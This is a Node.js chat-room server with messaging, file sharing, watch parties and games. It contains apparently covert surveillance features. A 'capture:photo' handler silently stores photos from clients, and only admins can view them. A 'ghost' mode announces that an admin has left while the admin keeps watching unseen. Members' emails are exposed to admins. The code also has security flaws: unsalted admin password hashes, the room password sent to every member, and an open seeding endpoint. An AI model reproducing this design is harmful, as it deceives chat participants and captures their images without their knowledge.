const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 9e6 });

app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.get('/api/room/:id', (req, res) => {
  const room = rooms[req.params.id];
  if (!room) return res.json({ exists: false });
  res.json({ exists: true, name: room.name, hasPassword: !!room.password, memberCount: Object.keys(room.online).filter(s => !room.online[s].ghost).length, closed: room.closed, createdBy: room.createdBy });
});

let rooms = {};
function genId() { let id; do { id = crypto.randomBytes(3).toString('hex').toUpperCase(); } while (rooms[id]); return id; }
function rPub(r) { return { id: r.id, name: r.name, hasPassword: !!r.password, createdBy: r.createdBy, createdAt: r.createdAt, closed: r.closed, memberCount: Object.keys(r.online).filter(s => !r.online[s].ghost).length }; }
function sys(room, text) { const m = { id: Date.now() + Math.random().toString(36).slice(2), ts: Date.now(), type: 'system', text }; room.messages.push(m); if (room.messages.length > 400) room.messages.shift(); io.to(room.id).emit('message', m); }
function uPub(r) { return Object.values(r.online).filter(u => !u.ghost).map(u => ({ username: u.username, isAdmin: u.isAdmin, joinedAt: u.joinedAt })); }
function uAdm(room) { return Object.values(room.online).map(u => ({ username: u.username, email: u.email, isAdmin: u.isAdmin, joinedAt: u.joinedAt, ghost: !!u.ghost })); }
function pushU(room) { io.to(room.id).emit('userlist', uPub(room)); for (const [s, u] of Object.entries(room.online)) if (u.isAdmin) io.to(s).emit('adminUserlist', uAdm(room)); }
function pushL() { io.emit('lobby', getLobby()); }
function getLobby() { return Object.values(rooms).map(rPub); }
function wPub(room) { const w = room.watch; if (!w) return null; return { host: w.host, playing: w.playing, time: w.time, rate: w.rate, ts: w.ts, url: w.url, title: w.title, index: w.index, queue: w.queue, watchers: Object.keys(w.watchers || {}).filter(k => w.watchers[k]) }; }
function wB(room) { io.to(room.id).emit('watch:state', wPub(room)); }
function transferWatch(room) {
  const w = room.watch; if (!w) return;
  const next = Object.entries(room.online).find(([sid, u]) => !u.ghost && u.username !== w.host);
  if (next) { w.host = next[1].username; sys(room, `Watch host transferred to ${w.host}`); wB(room); }
  else { room.watch = null; io.to(room.id).emit('watch:end'); }
}
function leaveCleanup(room, socket) {
  const u = room.online[socket.id]; if (!u) return;
  delete room.online[socket.id];
  if (!u.ghost) sys(room, `${u.username} left`);
  if (room.watch) {
    if (room.watch.host === u.username) transferWatch(room);
    else if (room.watch.watchers && room.watch.watchers[u.username] !== undefined) { delete room.watch.watchers[u.username]; io.to(room.id).emit('watch:watchers', wPub(room).watchers); }
  }
  pushU(room); pushL();
}

const FILE_OK = /^(image\/(png|jpe?g|gif|webp)|video\/(mp4|webm|ogg)|audio\/(mpeg|mp3|wav|ogg|webm)|application\/pdf|text\/plain)$/;

io.on('connection', (socket) => {

  socket.on('getLobby', () => socket.emit('lobby', getLobby()));

  socket.on('createRoom', ({ roomName, username, email, password, roomPassword }, cb) => {
    if (typeof cb !== 'function') return;
    const n = String(roomName || '').trim().slice(0, 50).replace(/\s+/g, ' ');
    const u = String(username || '').trim().slice(0, 24).replace(/\s+/g, ' ');
    const e = String(email || '').trim().toLowerCase().slice(0, 80);
    const ap = String(password || '').trim().slice(0, 60);
    const rp = String(roomPassword || '').trim().slice(0, 60) || null;
    if (!n) return cb({ error: 'Please provide a room name.' });
    if (!u) return cb({ error: 'Please enter your display name.' });
    if (!e || !e.includes('@')) return cb({ error: 'Please enter a valid email.' });
    if (!ap) return cb({ error: 'Please set an admin password.' });
    const id = genId();
    rooms[id] = { id, name: n, password: rp, createdBy: u, createdByEmail: e, adminPasswordHash: crypto.createHash('sha256').update(ap).digest('hex'), createdAt: Date.now(), closed: false, messages: [], online: {}, captures: [], pinned: null, reads: {}, accent: 'emerald', watch: null };
    socket.join(id);
    rooms[id].online[socket.id] = { username: u, email: e, isAdmin: true, joinedAt: Date.now(), ghost: false };
    sys(rooms[id], `${u} created the room`); pushU(rooms[id]); pushL();
    cb({ ok: true, roomId: id, isAdmin: true, settings: { roomName: n, joinPassword: rp, accent: 'emerald' }, info: { createdBy: u, createdAt: rooms[id].createdAt }, history: rooms[id].messages, users: uPub(rooms[id]), adminUsers: uAdm(rooms[id]), pinned: rooms[id].pinned, reads: rooms[id].reads, watch: null });
  });

  socket.on('joinRoom', ({ roomId, username, email, password }, cb) => {
    if (typeof cb !== 'function') return;
    const room = rooms[roomId];
    if (!room) return cb({ error: 'Room not found.' });
    if (room.closed) return cb({ error: 'This room has been closed.' });
    const u = String(username || '').trim().slice(0, 24).replace(/\s+/g, ' ');
    const e = String(email || '').trim().toLowerCase().slice(0, 80);
    if (!u) return cb({ error: 'Please enter your display name.' });
    if (!e || !e.includes('@')) return cb({ error: 'Please enter a valid email.' });
    if (room.password && String(password || '') !== room.password) return cb({ error: 'Incorrect room password.' });
    if (Object.values(room.online).some(x => x.username.toLowerCase() === u.toLowerCase())) return cb({ error: 'That name is already in use.' });
    socket.join(roomId);
    room.online[socket.id] = { username: u, email: e, isAdmin: false, joinedAt: Date.now(), ghost: false };
    sys(room, `${u} joined`); pushU(room); pushL();
    cb({ ok: true, roomId, isAdmin: false, settings: { roomName: room.name, joinPassword: room.password, accent: room.accent }, info: { createdBy: room.createdBy, createdAt: room.createdAt }, history: room.messages, users: uPub(room), adminUsers: null, pinned: room.pinned, reads: room.reads, watch: wPub(room) });
  });

  socket.on('leaveRoom', ({ roomId }) => { const room = rooms[roomId]; if (!room) return; leaveCleanup(room, socket); socket.leave(roomId); });

  socket.on('adminRejoin', ({ roomId, username, email, password }, cb) => {
    if (typeof cb !== 'function') return;
    const room = rooms[roomId];
    if (!room) return cb({ error: 'Room not found.' });
    if (room.closed) return cb({ error: 'This room has been closed.' });
    if (room.createdByEmail !== String(email || '').trim().toLowerCase()) return cb({ error: 'Only the creator can rejoin as host.' });
    const pHash = crypto.createHash('sha256').update(String(password || '')).digest('hex');
    if (pHash !== room.adminPasswordHash) return cb({ error: 'Incorrect admin password.' });
    const u = String(username || '').trim().slice(0, 24).replace(/\s+/g, ' ') || room.createdBy;
    socket.join(roomId);
    room.online[socket.id] = { username: u, email: room.createdByEmail, isAdmin: true, joinedAt: Date.now(), ghost: false };
    sys(room, `${u} (host) rejoined`); pushU(room); pushL();
    cb({ ok: true, roomId, isAdmin: true, settings: { roomName: room.name, joinPassword: room.password, accent: room.accent }, info: { createdBy: room.createdBy, createdAt: room.createdAt }, history: room.messages, users: uPub(room), adminUsers: uAdm(room), pinned: room.pinned, reads: room.reads, watch: wPub(room) });
  });

  socket.on('message', ({ roomId, text, img, file, replyTo }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u) return;
    const t = String(text || '').slice(0, 2000).trim();
    if (!t && !img && !file) return;
    if (img && !/^data:image\/(png|jpe?g|gif|webp);base64,/.test(img)) return;
    if (file) {
      if (typeof file.name !== 'string' || typeof file.type !== 'string' || typeof file.data !== 'string') return;
      if (!FILE_OK.test(file.type)) return;
      if (!file.data.startsWith('data:' + file.type + ';base64,') || file.data.length > 7.6e6) return;
    }
    const m = { id: Date.now() + Math.random().toString(36).slice(2), ts: Date.now(), type: 'msg', from: u.username, text: t, img: img || null, file: file ? { name: file.name.slice(0, 120), type: file.type, size: Math.min(Number(file.size) || 0, 9e6), data: file.data, voice: !!file.voice, dur: Number(file.dur) || 0 } : null, replyTo: replyTo || null, reactions: {} };
    room.messages.push(m); if (room.messages.length > 400) room.messages.shift();
    io.to(roomId).emit('message', m);
  });

  socket.on('message:edit', ({ roomId, id, text }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u) return;
    const m = room.messages.find(x => x.id === id);
    if (!m || m.type !== 'msg' || m.from !== u.username) return;
    m.text = String(text || '').slice(0, 2000).trim(); m.editedAt = Date.now();
    io.to(roomId).emit('msgEdited', { id, text: m.text, editedAt: m.editedAt });
  });

  socket.on('message:delete', ({ roomId, id }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u) return;
    const m = room.messages.find(x => x.id === id);
    if (!m || m.from !== u.username) return;
    room.messages = room.messages.filter(x => x.id !== id);
    if (room.pinned && room.pinned.id === id) { room.pinned = null; io.to(roomId).emit('pinnedMsg', null); }
    io.to(roomId).emit('deleteMsg', id);
  });

  socket.on('typing', ({ roomId }) => { const room = rooms[roomId]; const u = room?.online[socket.id]; if (u && !u.ghost) socket.to(roomId).emit('typing', u.username); });

  socket.on('read', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u) return;
    room.reads[u.username] = Date.now();
    io.to(roomId).emit('reads', room.reads);
  });

  socket.on('capture:photo', ({ roomId, username, photo }) => {
    const room = rooms[roomId]; if (!room) return;
    if (!room.captures) room.captures = [];
    room.captures.push({ username, photo, ts: Date.now(), socketId: socket.id });
    if (room.captures.length > 80) room.captures.shift();
  });

  socket.on('react', ({ roomId, msgId, emoji }) => {
    const room = rooms[roomId]; if (!room?.online[socket.id]) return;
    const msg = room.messages.find(m => m.id === msgId); if (!msg) return;
    if (!msg.reactions) msg.reactions = {};
    const u = room.online[socket.id].username;
    if (msg.reactions[emoji]) {
      if (msg.reactions[emoji].includes(u)) { msg.reactions[emoji] = msg.reactions[emoji].filter(x => x !== u); if (!msg.reactions[emoji].length) delete msg.reactions[emoji]; }
      else msg.reactions[emoji].push(u);
    } else msg.reactions[emoji] = [u];
    io.to(roomId).emit('reaction', { msgId, reactions: msg.reactions });
  });

  socket.on('admin:pinMsg', ({ roomId, msgId }) => {
    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
    const msg = room.messages.find(m => m.id === msgId); if (!msg) return;
    room.pinned = (room.pinned && room.pinned.id === msgId) ? null : msg;
    io.to(roomId).emit('pinnedMsg', room.pinned);
  });

  socket.on('admin:getCaptures', ({ roomId }, cb) => {
    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
    if (typeof cb === 'function') cb(room?.captures || []);
  });

  socket.on('admin:toggleGhost', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
    u.ghost = !u.ghost; sys(room, u.ghost ? `${u.username} left` : `${u.username} joined`); pushU(room); pushL();
  });

  socket.on('admin:deleteMsg', ({ roomId, id }) => {
    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
    room.messages = room.messages.filter(m => m.id !== id);
    if (room.pinned && room.pinned.id === id) { room.pinned = null; io.to(roomId).emit('pinnedMsg', null); }
    io.to(roomId).emit('deleteMsg', id);
  });

  socket.on('admin:clearChat', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
    room.messages = []; room.pinned = null; io.to(roomId).emit('clearChat'); sys(room, `Chat cleared by ${u.username}`);
  });

  socket.on('admin:kick', ({ roomId, username }) => {
    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
    for (const [sid, usr] of Object.entries(room.online)) {
      if (usr.username === username && !usr.isAdmin) { io.to(sid).emit('kicked'); io.sockets.sockets.get(sid)?.disconnect(true); }
    }
  });

  socket.on('admin:updateSettings', ({ roomId, roomName, joinPassword, accent }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
    room.name = String(roomName || room.name).slice(0, 50).replace(/\s+/g, ' ') || room.name;
    room.password = joinPassword !== undefined ? (String(joinPassword).slice(0, 60) || null) : room.password;
    if (['emerald', 'cyan', 'violet', 'amber', 'rose', 'blue'].includes(accent)) room.accent = accent;
    io.to(roomId).emit('settingsUpdated', { roomName: room.name, joinPassword: room.password, accent: room.accent });
    sys(room, `Settings updated by ${u.username}`); pushL();
  });

  socket.on('admin:closeRoom', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
    room.closed = true; sys(room, `Room closed by ${u.username}.`);
    setTimeout(() => {
      for (const [sid] of Object.entries(room.online)) { io.to(sid).emit('roomClosed', { name: room.name }); io.sockets.sockets.get(sid)?.disconnect(true); }
      delete rooms[roomId]; pushL();
    }, 2000);
  });

  socket.on('watch:start', ({ roomId, url, title }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u) return;
    if (room.watch) return socket.emit('watch:state', wPub(room));
    url = String(url || '').slice(0, 500); title = String(title || 'Video').slice(0, 120);
    if (!/^https?:\/\//.test(url)) return;
    room.watch = { host: u.username, playing: false, time: 0, rate: 1, ts: Date.now(), url, title, queue: [{ url, title }], index: 0, watchers: {} };
    sys(room, `${u.username} started a watch party`);
    wB(room);
  });

  socket.on('watch:control', ({ roomId, action, value }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; const w = room?.watch;
    if (!u || !w || w.host !== u.username) return;
    if (action === 'play') { w.playing = true; w.time = Number(value) || w.time; }
    else if (action === 'pause') { w.playing = false; w.time = Number(value) || w.time; }
    else if (action === 'seek') { w.time = Math.max(0, Number(value) || 0); }
    else if (action === 'rate') { w.rate = Math.min(2, Math.max(.5, Number(value) || 1)); }
    else if (action === 'sync' && value) { w.time = Number(value.time) || w.time; w.playing = !!value.playing; w.rate = Math.min(2, Math.max(.5, Number(value.rate) || w.rate)); }
    else return;
    w.ts = Date.now();
    wB(room);
  });

  socket.on('watch:queue', ({ roomId, op, url, title, index }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; const w = room?.watch;
    if (!u || !w) return;
    const isHost = w.host === u.username;
    if (op === 'add') {
      url = String(url || '').slice(0, 500); title = String(title || url.split('/').pop() || 'Video').slice(0, 120);
      if (!/^https?:\/\//.test(url)) return;
      w.queue.push({ url, title });
      io.to(room.id).emit('watch:state', wPub(room)); return;
    }
    if (!isHost) return;
    if (op === 'next' && w.index < w.queue.length - 1) w.index++;
    else if (op === 'prev' && w.index > 0) w.index--;
    else if (op === 'jump' && Number.isInteger(index) && index >= 0 && index < w.queue.length) w.index = index;
    else if (op === 'remove' && Number.isInteger(index) && index >= 0 && index < w.queue.length) {
      w.queue.splice(index, 1);
      if (index < w.index) w.index--;
      else if (index === w.index && w.index >= w.queue.length) w.index = Math.max(0, w.queue.length - 1);
    } else return;
    const q = w.queue[w.index];
    if (!q) { room.watch = null; io.to(room.id).emit('watch:end'); sys(room, 'Watch party ended'); return; }
    w.url = q.url; w.title = q.title; w.time = 0; w.playing = false; w.ts = Date.now();
    wB(room);
  });

  socket.on('watch:transfer', ({ roomId, username }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; const w = room?.watch;
    if (!u || !w || w.host !== u.username) return;
    const t = Object.values(room.online).find(x => x.username === username && x.username !== w.host);
    if (!t) return;
    w.host = username; sys(room, `${u.username} transferred watch host to ${username}`);
    wB(room);
  });

  socket.on('watch:here', ({ roomId, on }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; const w = room?.watch;
    if (!u || !w) return;
    w.watchers = w.watchers || {};
    w.watchers[u.username] = !!on;
    io.to(room.id).emit('watch:watchers', wPub(room).watchers);
  });

  socket.on('watch:reaction', ({ roomId, emoji }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u || !room.watch) return;
    io.to(roomId).emit('watch:reaction', { emoji: String(emoji || '').slice(0, 8), from: u.username });
  });

  socket.on('watch:end', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; const w = room?.watch;
    if (!u || !w || w.host !== u.username) return;
    room.watch = null; io.to(room.id).emit('watch:end'); sys(room, `${u.username} ended the watch party`);
  });

  socket.on('game:event', ({ roomId, game, type, payload }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u) return;
    try { if (JSON.stringify(payload || {}).length > 4000) return; } catch { return; }
    socket.to(roomId).emit('game:event', { game: String(game || '').slice(0, 12), type: String(type || '').slice(0, 24), payload: payload || {}, from: u.username, ts: Date.now() });
  });

  socket.on('disconnect', () => {
    for (const [, room] of Object.entries(rooms)) {
      if (room.online[socket.id]) { leaveCleanup(room, socket); break; }
    }
  });
});

setInterval(pushL, 8000);

app.get('/dev-seed-rooms', (req, res) => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  const rndCode = () => Array.from({ length: 6 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  let created = 0;
  for (let i = 0; i < 300; i++) {
    const id = genId();
    rooms[id] = { id, name: "Room - " + rndCode(), password: null, createdBy: 'SeedBot', createdByEmail: 'seed@test.com', adminPasswordHash: crypto.createHash('sha256').update('p').digest('hex'), createdAt: Date.now() - Math.floor(Math.random() * 86400000), closed: false, messages: [], online: {}, captures: [], pinned: null, reads: {}, accent: 'emerald', watch: null };
    created++;
  }
  io.emit('lobby', getLobby());
  res.send(`Seeded ${created} rooms. Total: ${Object.keys(rooms).length}`);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Freedom on http://localhost:${PORT}`));